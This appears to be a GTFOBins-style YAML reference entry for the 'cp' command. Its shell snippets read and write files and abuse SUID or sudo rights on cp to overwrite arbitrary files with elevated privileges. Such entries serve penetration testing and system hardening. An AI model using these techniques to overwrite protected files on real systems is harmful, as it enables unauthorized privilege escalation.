---
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        cp "$LFILE" /dev/stdout
  file-write:
    - code: |
        LFILE=file_to_write
        echo "DATA" | cp /dev/stdin "$LFILE"
  suid:
    - code: |
        LFILE=file_to_write
        echo "DATA" | ./cp /dev/stdin "$LFILE"
    - description: This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)
      code: |
        LFILE=file_to_write
        TF=$(mktemp)
        echo "DATA" > $TF
        ./cp $TF $LFILE
  sudo:
    - code: |
        LFILE=file_to_write
        echo "DATA" | sudo cp /dev/stdin "$LFILE"
    - description: This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)
      code: |
        LFILE=file_to_write
        TF=$(mktemp)
        echo "DATA" > $TF
        sudo cp $TF $LFILE
---
